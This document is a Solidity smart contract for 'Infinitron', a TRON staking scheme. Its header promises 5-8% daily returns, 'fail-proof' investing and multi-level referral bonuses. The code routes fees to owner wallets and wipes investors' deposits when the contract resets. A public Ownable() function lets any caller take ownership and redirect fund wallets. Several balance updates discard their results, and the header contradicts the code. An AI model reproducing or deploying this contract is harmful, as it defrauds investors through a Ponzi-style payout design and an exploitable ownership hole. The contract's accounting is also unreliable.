//SourceUnit: BTT.sol

 /*   Infinitron - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *	  The first & ONLY staking platform participating in operation HARPOON
 *    The first and only FAIL-PROOF INVESTING PLATFORM
 *
 *
 * 	  2% of all investments go into the life boat, then When the balance hit 0 and a new investor invests
 *	  funds from the lifeboat get sent back into the new contract & INFINITRON resets itself back to standard ROI
 *	  That initial investor will be rewarded with a percentage of the lifeboat.
 * 	  All stakes will be wiped out and we all get a fresh start. WE CONTROL THE LIFE OF DIGITRON
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://Infini-tron.com                                    │
 *   │                                                                       │
 *   │   Telegram Live Support: @infini-tron                                 |
 *   │   Telegram Public Group: @Infinitron                                  |
 *   |                                                                       |
 *   |                                                                       |           
 *   |   E-mail: admin@infini-tron.com                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Choose one of the tariff plans, enter the TRX amount (50 TRX minimum) using our website "Stake" button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Basic interest rate: +0.3% every 24 hours - only for new deposits
 *   - Minimal deposit: 200 TRX
 *   - Maximum deposit: 50,000 TRX
 *   - Maximum trx allowed to be staked by a single address: 500,000 TRX
 *   - Maximum trx allowed to be staked in single cap: 20,000 TRX ~ (subject to change)

 *   - Total income: based on your tarrif plan (from 5% to 8% daily) 
 *   - Earnings every moment, withdraw any time AFTER 24 hours  (if you use capitalization of interest you can withdraw only after end of your deposit) 
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 3-level referral commission: 3% - 2% - 1%
 *
 *   [FUNDS DISTRIBUTION]
 *	  84% payouts to investors
 *	  6% to affiliate/partnership ROI
 *	  2% to the lifeboat - an external contract that will refund and reseed this contract in the event of its death.  ****Requirements - THIS contract balance must be 0
 *	  8%  Developer cost, Marketing, Hosting, contests. 
 */

pragma solidity 0.5.9;

contract lifeBoatInterface { // This doesn't have to match the real contract name. Call it what you like.
	function reviveInfiniTron(address payable _investerZero, bool _isTrx) external payable {

	}
}


contract Infinitron {
	using SafeMath for uint256;
	uint256 constant public BTT_LIMIT_MULTIPLIER = 1000;
	uint256 constant public WHALE_BALANCE_LIMIT = 75000 trx;
	uint256 constant public TOTAL_INVEST_MAX = 500000 trx;
	uint256 constant public INVEST_MAX_AMOUNT = 50000 trx;
	uint256 constant public INVEST_MIN_AMOUNT = 200 trx;
	uint256 public INVEST_MAX_CAP_AMOUNT = 20000 trx;
	uint8  public LIMIT_CAP_STAKES = 3;

	uint256[] public REFERRAL_PERCENTS = [30, 20, 10];

	uint256 constant public BTT_TOKEN_ID = 1002000;
	uint256 constant public PROJECT_FEE = 60;
	uint256 constant public MARKETING_FEE = 20;
	uint256 constant public LIFEBOAT_FEE = 20;
	uint256 constant public PERCENT_STEP = 3;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
    uint256 public miniPeriod = 24 hours;
	uint256 public totalStaked;
	uint256 public totalRefBonus;
	int private authCode;
	address private owner;



  struct Plan {
        uint256 time;
        uint256 percent;
  }

	struct Whales {
        address whaleWallet;
  }

    Plan[] internal plans;
    Whales[] internal knownWhales;

	struct Deposit {
        bool isTrx;
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 checkpointBTT;
		address referrer;
		uint256[3] levels;
		uint256 bonus;
		uint256 bonusBTT;
    
		uint256 totalBonus;
		uint256 totalBonusBTT;

		uint256 totalStaked;
		uint256 totalStakedBTT;
		uint256 totalWithdrawn;
		uint256 totalWithdrawnBTT;

	}


	mapping (address => User) internal users;

	uint256 public startUNIX;
	address payable public commissionWallet;
	address payable public marketingWallet;
	address payable public lifeBoatContract;
	uint256 public livesLived;

	event Newbie(address user);
	event NewDeposit(address indexed user,bool isTrx, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address contractOwner, address payable wallet,address payable markWallet, uint256 startDate, int devAuthCode) public {
		require(!isContract(wallet));
		require(startDate > 0);
		owner = contractOwner;
		commissionWallet = wallet;
		marketingWallet = markWallet;
		startUNIX = startDate;
		livesLived = 1;
		authCode = devAuthCode;

        plans.push(Plan(14, 80));
        plans.push(Plan(21, 65));
        plans.push(Plan(28, 50));
        plans.push(Plan(14, 80));
        plans.push(Plan(21, 65));
        plans.push(Plan(28, 50));

		
	}

  //reset start date
  //wipe deposits,
  //reset plans

    function() external payable {

	}


	function reviveInfiniTron(address payable inverstorZero, bool _isTrx) public {
		require(isContract(lifeBoatContract), "MUST BE CONTRACT ADDRESS");
		require(getContractBalance(_isTrx) == 0, "CONTRACT MUST BE AT ZERO BALANCE");
		livesLived++;
    	startUNIX = block.timestamp;

		lifeBoatInterface lifeboatinterface = lifeBoatInterface(lifeBoatContract);
		lifeboatinterface.reviveInfiniTron(inverstorZero, _isTrx);


	}

	function Ownable() public {
    	owner = msg.sender;
  	}

  	modifier onlyOwner() {
    	require(msg.sender == owner);
    	_;
  	}

  	function transferOwnership(address newOwner) public onlyOwner {
    	require(newOwner != address(0));
   		owner = newOwner;
  	}
  
    function setLifeboatAddress(address payable newLifeBoatAddress) public onlyOwner {
    	require(lifeBoatContract != newLifeBoatAddress);
   		lifeBoatContract = newLifeBoatAddress;
  	}


	function setMarketingWallet(address payable newMarketingWallet) public onlyOwner {
    	require(marketingWallet != newMarketingWallet);
   		marketingWallet = newMarketingWallet;
  	}
	
  	function updateMaxNumberOfCaps(uint8 _newMax) public onlyOwner {
    	require(LIMIT_CAP_STAKES != _newMax, "CURRENT VALUE IS MAX");
   		LIMIT_CAP_STAKES = _newMax;
  	}


	function updateMaxCapAllowed(uint8 _newMax) public onlyOwner {
    	require(INVEST_MAX_CAP_AMOUNT != _newMax, "CURRENT VALUE IS MAX");
   		INVEST_MAX_CAP_AMOUNT = _newMax;
  	}

	function invest(address referrer, uint8 plan, bool _isTrx) public payable {
		if(_isTrx){ //tron
			require(getUserCheckpoint(msg.sender, _isTrx) > startUNIX, "CONTRACT NEEDS TO BE REVIVED! GET THE BONUS DO IT NOW");
			require(msg.value <= INVEST_MAX_AMOUNT, " OVER MAX INVESMENT LIMIT");
			require(msg.value >= INVEST_MIN_AMOUNT, " UNDER MIN INVESTMENT AMOUNT");
			require(getUserTotalAtStake(msg.sender, _isTrx).add(msg.value) <= TOTAL_INVEST_MAX, "OVER MAX LIMIT OF TOTAL INVESTED");
			require(plan < 6, "Invalid plan");

			uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
			uint256 marketingFee = msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
			uint256 lifeboatSavings = msg.value.mul(LIFEBOAT_FEE).div(PERCENTS_DIVIDER);
			commissionWallet.transfer(fee);
			marketingWallet.transfer(marketingFee);
			lifeBoatContract.transfer(lifeboatSavings);
			emit FeePayed(msg.sender, fee);
		
			User storage user = users[msg.sender];

			if(msg.sender.balance >= WHALE_BALANCE_LIMIT){
				addToKnownWhaleWallets(authCode, msg.sender);
			}

			if (user.referrer == address(0)) {
				if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
					user.referrer = referrer;
				}

				address upline = user.referrer;
				for (uint256 i = 0; i < 3; i++) {
					if (upline != address(0)) {
						users[upline].levels[i] = users[upline].levels[i].add(1);
						upline = users[upline].referrer;
					} else break;
				}
			}

			if (user.referrer != address(0)) {

				address upline = user.referrer;
				for (uint256 i = 0; i < 3; i++) {
					if (upline != address(0)) {
						uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
						users[upline].bonus = users[upline].bonus.add(amount);
						users[upline].totalBonus = users[upline].totalBonus.add(amount);
						emit RefBonus(upline, msg.sender, i, amount);
						upline = users[upline].referrer;
					} else break;
				}

			}

			if (user.deposits.length == 0) {
				emit Newbie(msg.sender);
			}
				if(verifyAddressNotWhale(msg.sender)){
					require(verifyAddressNotWhale(msg.sender), " WALLET BANNED, NO WHALES ALLOWED");

					if(plan > 2){
						require(msg.value <= INVEST_MAX_CAP_AMOUNT, " INVESTMENT CANNOT BE MORE THAN THE LIMIT");
						require(getNumberOfActiveCapStakes(msg.sender, _isTrx) < LIMIT_CAP_STAKES, " REACHED CAP STAKE LIMIT");
						(uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);
						user.totalStaked.add(msg.value);
						user.deposits.push(Deposit(_isTrx, plan, percent, msg.value, profit, block.timestamp, finish));

					}else{
						(uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);
						user.totalStaked.add(msg.value);
						user.deposits.push(Deposit(_isTrx, plan, percent, msg.value, profit, block.timestamp, finish));
					}
					user.checkpoint = block.timestamp;
					user.totalStaked.add(msg.value);

						
				}


		}else{//BTT
			require(getUserCheckpoint(msg.sender, _isTrx) > startUNIX, "CONTRACT NEEDS TO BE REVIVED! GET THE BONUS DO IT NOW");
			require(plan < 6, "Invalid plan");
			uint256 fee = msg.tokenvalue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
			uint256 marketingFee = msg.tokenvalue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
			uint256 lifeboatSavings = msg.tokenvalue.mul(LIFEBOAT_FEE).div(PERCENTS_DIVIDER);
			commissionWallet.transferToken(fee, BTT_TOKEN_ID);
			marketingWallet.transferToken(marketingFee, BTT_TOKEN_ID);
			lifeBoatContract.transferToken(lifeboatSavings, BTT_TOKEN_ID);
			emit FeePayed(msg.sender, fee);
		
			User storage user = users[msg.sender];

			if(msg.sender.balance >= WHALE_BALANCE_LIMIT.mul(BTT_LIMIT_MULTIPLIER)){
				addToKnownWhaleWallets(authCode, msg.sender);
			}

			if (user.referrer == address(0)) {
				if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
					user.referrer = referrer;
				}

				address upline = user.referrer;
				for (uint256 i = 0; i < 3; i++) {
					if (upline != address(0)) {
						users[upline].levels[i] = users[upline].levels[i].add(1);
						upline = users[upline].referrer;
					} else break;
				}
			}

			if (user.referrer != address(0)) {

				address upline = user.referrer;
				for (uint256 i = 0; i < 3; i++) {
					if (upline != address(0)) {
						uint256 amount = msg.tokenvalue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
						users[upline].bonusBTT = users[upline].bonus.add(amount);
						users[upline].totalBonusBTT = users[upline].totalBonus.add(amount);
						emit RefBonus(upline, msg.sender, i, amount);
						upline = users[upline].referrer;
					} else break;
				}

			}

			if (user.deposits.length == 0) {
				emit Newbie(msg.sender);
			}
				if(verifyAddressNotWhale(msg.sender)){
					require(verifyAddressNotWhale(msg.sender), " WALLET BANNED, NO WHALES ALLOWED");

					if(plan > 2){
						require(msg.tokenvalue <= INVEST_MAX_CAP_AMOUNT.mul(BTT_LIMIT_MULTIPLIER), " INVESTMENT CANNOT BE MORE THAN THE LIMIT");
						require(getNumberOfActiveCapStakes(msg.sender, _isTrx) < LIMIT_CAP_STAKES, " REACHED CAP STAKE LIMIT");
						(uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.tokenvalue);
						user.totalStakedBTT.add(msg.tokenvalue);
						user.deposits.push(Deposit(_isTrx, plan, percent, msg.tokenvalue, profit, block.timestamp, finish));

					}else{
						(uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.tokenvalue);
						user.totalStakedBTT.add(msg.tokenvalue);
						user.deposits.push(Deposit(_isTrx, plan, percent, msg.tokenvalue, profit, block.timestamp, finish));
					}
					user.checkpointBTT = block.timestamp;
					user.totalStakedBTT.add(msg.tokenvalue);

						
				}
		}
		
                
          
	}

	function cutAndRun(bool _isTrx) public {
	    User storage user = users[msg.sender];
		uint256 cutAndRunThreshHold = getCutAndRunThreshHold(msg.sender, _isTrx);
		uint256 userWithdrawn = getUserWithdrawn(msg.sender, _isTrx);

		if(_isTrx){
			uint256 contractBalance = address(this).balance;
			if (contractBalance < cutAndRunThreshHold) {
				userWithdrawn = contractBalance;
			}else{
				if( userWithdrawn <= cutAndRunThreshHold){
				uint256 cutAndRunAvailable = cutAndRunThreshHold.sub(userWithdrawn);
          if(cutAndRunAvailable > 0){
            user.totalWithdrawn.add(cutAndRunAvailable);
            msg.sender.transfer(cutAndRunAvailable);
            emit Withdrawn(msg.sender, cutAndRunAvailable);
          }
        }
			}
		}else{//BTT
			uint256 contractBalance = address(this).tokenBalance(BTT_TOKEN_ID);
			if (contractBalance < cutAndRunThreshHold) {
				userWithdrawn = contractBalance;
			}else{
				if( userWithdrawn <= cutAndRunThreshHold){
					uint256 cutAndRunAvailable = cutAndRunThreshHold.sub(userWithdrawn);
					if(cutAndRunAvailable > 0){
						user.totalWithdrawnBTT.add(cutAndRunAvailable);
						msg.sender.transferToken(cutAndRunAvailable, BTT_TOKEN_ID);
						emit Withdrawn(msg.sender, cutAndRunAvailable);

					}
				}
		    }
	    
        }
        
        deleteUserDepositsByType(authCode, msg.sender, _isTrx);


		

	}
	
	function withdraw(bool _isTrx) public {

		User storage user = users[msg.sender];

		if(_isTrx){
		    require(user.checkpoint.add(miniPeriod) < block.timestamp, "Withdrawal time is not reached");

			uint256 totalAmount = getUserDividends(msg.sender, _isTrx);
			if(startUNIX > user.checkpoint){
				deleteUserDepositsByType(authCode, msg.sender, _isTrx); //remove previous life deposits. good luck in this new life.
			}
			uint256 referralBonus = getUserReferralBonus(msg.sender, _isTrx);
			if (referralBonus > 0) {
				user.bonus = 0;
				totalAmount = totalAmount.add(referralBonus);
			}

			require(totalAmount > 0, "User has no dividends");

			uint256 contractBalance = address(this).balance;
			if (contractBalance < totalAmount) {
				totalAmount = contractBalance;
			}


		user.totalWithdrawn.add(totalAmount);
		user.checkpoint = block.timestamp;
		msg.sender.transfer(totalAmount);
		emit Withdrawn(msg.sender, totalAmount);

		}else{//BTT
		require(user.checkpointBTT.add(miniPeriod) < block.timestamp, "Withdrawal time is not reached");

		uint256 totalAmount = getUserDividends(msg.sender, _isTrx);
			if(startUNIX > user.checkpointBTT){
				deleteUserDepositsByType(authCode, msg.sender, _isTrx); //remove previous life deposits. good luck in this new life.
			}
			uint256 referralBonus = getUserReferralBonus(msg.sender, _isTrx);
			if (referralBonus > 0) {
				user.bonusBTT = 0;
				totalAmount = totalAmount.add(referralBonus);
			}

			require(totalAmount > 0, "User has no dividends");

			uint256 contractBalance = address(this).tokenBalance(BTT_TOKEN_ID);
			if (contractBalance < totalAmount) {
				totalAmount = contractBalance;
			}


		user.totalWithdrawnBTT.add(totalAmount);
		user.checkpointBTT = block.timestamp;
		msg.sender.transferToken(totalAmount, BTT_TOKEN_ID);
		emit Withdrawn(msg.sender, totalAmount);
		}
		
		

	}

	function getContractBalance(bool _isTrx) public view returns (uint256) {
		if(_isTrx){
			return address(this).balance;

		}else{//BTT
			return address(this).tokenBalance(BTT_TOKEN_ID);

		}
	}

	function getLifeBoatBalance(bool _isTrx) public view returns (uint256) {
		if(_isTrx){
			return address(lifeBoatContract).balance;

		}else{//BTT
			return address(lifeBoatContract).tokenBalance(BTT_TOKEN_ID);

		}
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getPercent(uint8 plan) public view returns (uint256) {
		if (block.timestamp > startUNIX) {
			return plans[plan].percent.add(PERCENT_STEP.mul(block.timestamp.sub(startUNIX)).div(TIME_STEP));
		} else {
			return plans[plan].percent;
		}
    }



    function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
		percent = getPercent(plan);

		if (plan < 3) {
			profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
		} else if (plan < 6) {
			for (uint256 i = 0; i < plans[plan].time; i++) {
				profit = profit.add((deposit.add(profit)).mul(percent).div(PERCENTS_DIVIDER));
			}
		}

		finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
	}
	
	function deleteUserDepositsByType(int auth, address userAddress, bool _isTrx) private {
	    		require(auth == authCode);
	    		User storage user = users[userAddress];
	    		for (uint256 i = 0; i < user.deposits.length; i++) {
				if (user.deposits[i].isTrx == _isTrx) {
				    delete user.deposits[i];
				}
			}

	    
	}

	function getUserDividends(address userAddress, bool _isTrx) public view returns (uint256) {
		User storage user = users[userAddress];
		if(_isTrx){
			uint256 totalAmount;
			uint256 lossLimit = getCutAndRunThreshHold(userAddress, _isTrx).sub(getUserWithdrawn(userAddress, _isTrx));

			if(getUserCheckpoint(userAddress, _isTrx) < startUNIX){ //contract revived start is now greater than all checkopoints of Previous life
				require(lossLimit > 0, " CUT AND RUN THRESHOLD ALDREADY MET");
				return lossLimit;
				
			}


			for (uint256 i = 0; i < user.deposits.length; i++) {
				if (user.checkpoint < user.deposits[i].finish) {
					if (user.deposits[i].plan < 3 && user.deposits[i].isTrx) {
						uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
						uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
						uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
						if (from < to) {
							totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
						}
					} else if (block.timestamp > user.deposits[i].finish && user.deposits[i].isTrx) {
						totalAmount = totalAmount.add(user.deposits[i].profit);
					}
				}
			}

			return totalAmount;


		}else{//BTT
			uint256 totalAmount;
			uint256 lossLimit = getCutAndRunThreshHold(userAddress, _isTrx).sub(getUserWithdrawn(userAddress, _isTrx));

			if(getUserCheckpoint(userAddress, _isTrx) < startUNIX){ //contract revived start is now greater than all checkopoints of Previous life
				require(lossLimit > 0, " CUT AND RUN THRESHOLD ALDREADY MET");
				return lossLimit;
				
			}


			for (uint256 i = 0; i < user.deposits.length; i++) {
				if (user.checkpointBTT < user.deposits[i].finish) {
					if (user.deposits[i].plan < 3 && !user.deposits[i].isTrx) {
						uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
						uint256 from = user.deposits[i].start > user.checkpointBTT ? user.deposits[i].start : user.checkpointBTT;
						uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
						if (from < to) {
							totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
						}
					} else if (block.timestamp > user.deposits[i].finish && !user.deposits[i].isTrx) {
						totalAmount = totalAmount.add(user.deposits[i].profit);
					}
				}
			}

			return totalAmount;

		}
		
	}

	function getUserTotalAtStake(address userAddress, bool _isTrx) public view returns (uint256) {

		if(_isTrx){
			User storage user = users[userAddress];
			uint256 totalAmount;

			for (uint256 i = 0; i < user.deposits.length; i++) {
				if (block.timestamp < user.deposits[i].finish && user.deposits[i].isTrx) {
						uint256 share = user.deposits[i].amount;
						totalAmount = totalAmount.add(share);
					
					
				}
			}

		return totalAmount;
		}else{//BTT
			User storage user = users[userAddress];
			uint256 totalAmount;

			for (uint256 i = 0; i < user.deposits.length; i++) {
				if (block.timestamp < user.deposits[i].finish && !user.deposits[i].isTrx ) {
						uint256 share = user.deposits[i].amount;
						totalAmount = totalAmount.add(share);
					
					
				}
			}

			return totalAmount;
		}
		
	}

    function getUserWithdrawn(address userAddress, bool _isTrx) public view returns (uint256) {

		if(_isTrx){
			User storage user = users[userAddress];
			uint256 totalAmount = 0;

			for (uint256 i = 0; i < user.deposits.length; i++) {
				if (user.checkpoint < user.deposits[i].finish && user.deposits[i].isTrx) {
					if (user.deposits[i].plan < 3) {
						if(user.checkpoint > user.deposits[i].start){
							uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
							uint256 from = user.deposits[i].start;
							uint256 to = user.checkpoint;
							totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
						}
					} 
				}
			}

			return (totalAmount);
		}else{//BTT
			User storage user = users[userAddress];
			uint256 totalAmount = 0;

			for (uint256 i = 0; i < user.deposits.length; i++) {
				if (user.checkpointBTT < user.deposits[i].finish && !user.deposits[i].isTrx) {
					if (user.deposits[i].plan < 3) {
						if(user.checkpointBTT > user.deposits[i].start){
							uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
							uint256 from = user.deposits[i].start;
							uint256 to = user.checkpointBTT;
							totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
						}
					} 
				}
			}

			return (totalAmount);
		}
		
	}

	function readCustomerBalance() public view returns (uint) {
  		return msg.sender.balance;
	}
	
	function getUserCheckpoint(address userAddress, bool _isTrx) public view returns(uint256) {
        User storage user = users[userAddress];
    
        if(getUserAmountOfDeposits(userAddress, _isTrx) == 0){
    		  return block.timestamp;
        }else{
            if(_isTrx){
                return users[userAddress].checkpoint;
    
            }else{
                return users[userAddress].checkpointBTT;
    
            }
    
        }
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
	}

	function getUserReferralBonus(address userAddress, bool _isTrx) public view returns(uint256) {
    if(_isTrx){
		  return users[userAddress].bonus;

    }else{//BTT
		  return users[userAddress].bonusBTT;

    }
	}

	function getUserReferralTotalBonus(address userAddress, bool _isTrx) public view returns(uint256) {

    if(_isTrx){
		  return users[userAddress].totalBonus;

    }else{
		  return users[userAddress].totalBonusBTT;

    }
	}

	function getUserReferralWithdrawn(address userAddress, bool _isTrx) public view returns(uint256) {
    if(_isTrx){
      return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }else{//BTT
      return users[userAddress].totalBonusBTT.sub(users[userAddress].bonusBTT);

    }
	}

	function getUserAvailable(address userAddress, bool _isTrx) public view returns(uint256) {
		return getUserReferralBonus(userAddress, _isTrx).add(getUserDividends(userAddress, _isTrx));
	}

	function addToKnownWhaleWallets(int auth, address userAddress) public {
		require(!isContract(userAddress));
		require(userAddress != owner);
		require(auth == authCode);
		require(verifyAddressNotWhale(userAddress));
		knownWhales.push(Whales(userAddress));
	}

	function getTotalBannedWhaleWallets() public view returns(uint256) {
		return knownWhales.length;
	}
	
	function verifyAddressNotWhale(address potentialInvestor) public view returns(bool){
	    
		for (uint256 i = 0; i < knownWhales.length; i++) {
				if (potentialInvestor == knownWhales[i].whaleWallet) {
					return false;
				} 
		}
		
		return true;
	}


	
	function getUserAmountOfDeposits(address userAddress, bool _isTrx) public view returns(uint256) {
        User storage user = users[userAddress];

	    uint256 number = 0; 
	    for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			if(_isTrx == user.deposits[i].isTrx ){
    		      number++;

		    }
		}
		return number;
	}


	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}
	
	function getCutAndRunThreshHold(address userAddress, bool _isTrx) public view returns(uint256 amount) {
			amount = getUserTotalAtStake(userAddress,_isTrx).div(2);
		
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(bool isTrx, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
	  User storage user = users[userAddress];
		isTrx = user.deposits[index].isTrx;
		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;
	}

	function getNumberOfActiveCapStakes(address userAddress, bool _isTrx) public view returns(uint256 number) {
        number = 0;
        User storage user = users[userAddress];

    if(_isTrx){
	  	  for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			    if(user.deposits[i].plan >2 && user.deposits[i].isTrx ){
            if(user.checkpoint < users[userAddress].deposits[i].finish ){
				      number++;

            }
			    }
        }

    }else{//BTT
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			    if(user.deposits[i].plan >2 && !user.deposits[i].isTrx ){
            if(user.checkpointBTT < users[userAddress].deposits[i].finish ){
				      number++;

            }
			    }
        }
    }
		
	
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}